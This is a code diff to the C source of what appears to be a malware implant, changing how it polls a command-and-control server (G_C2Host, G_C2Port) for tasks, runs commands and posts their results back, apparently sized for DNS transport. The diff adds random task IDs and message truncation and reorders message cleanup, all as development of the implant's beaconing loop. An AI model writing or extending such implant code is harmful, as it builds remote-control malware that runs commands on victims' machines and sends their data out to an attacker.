@@ -90,7 +90,13 @@ static BOOL SendTaskResult(
 		CopyMemory(payload + sizeof(resultHeader), resultData, resultLength);
 	}
 
-	success = SendTlvMessage(sock, MSG_AGENT_POST_RESULT, payloadLength, payload);
+	//if message too large, truncate
+	if (payloadLength > (MAX_MESSAGE_SIZE - DNS_HEADER_SIZE))
+	{
+		SecureZeroMemory(payload + MAX_MESSAGE_SIZE - DNS_HEADER_SIZE, payloadLength - (MAX_MESSAGE_SIZE - DNS_HEADER_SIZE));
+		payloadLength = MAX_MESSAGE_SIZE - DNS_HEADER_SIZE;
+	}
+	success = SendTlvMessage(sock, (USHORT)taskId, MSG_AGENT_POST_RESULT, payloadLength, payload);
 	ImplantHeapFree(payload);
 
 	return success;
@@ -112,14 +118,18 @@ static VOID PollServerOnce(VOID)
 	PBYTE commandResult = NULL;
 	DWORD commandResultLength = 0;
 	DWORD commandStatus = NO_ERROR;
+	UINT taskId = 0;
 
 	if (!NetworkInit(G_C2Host, G_C2Port, &sock))
 	{
 		return;
 	}
 
+	rand_s(&taskId);
+
 	if (!SendTlvMessage(
 		sock,
+		(USHORT)taskId,
 		MSG_AGENT_GET_TASK,
 		sizeof(getTaskRequest),
 		(CONST PBYTE)&getTaskRequest
@@ -159,9 +169,6 @@ static VOID PollServerOnce(VOID)
 			&commandResultLength
 		);
 
-		FreeTlvMessage(&responseMessage);
-		RtlSecureZeroMemory(&responseMessage, sizeof(responseMessage));
-
 		if (!SendTaskResult(
 			sock,
 			taskHeader->taskId,
@@ -173,6 +180,9 @@ static VOID PollServerOnce(VOID)
 		{
 			goto cleanup;
 		}
+
+		FreeTlvMessage(&responseMessage);
+		RtlSecureZeroMemory(&responseMessage, sizeof(responseMessage));
 
 		(void)RecvMessage(sock, &responseMessage);
 	}
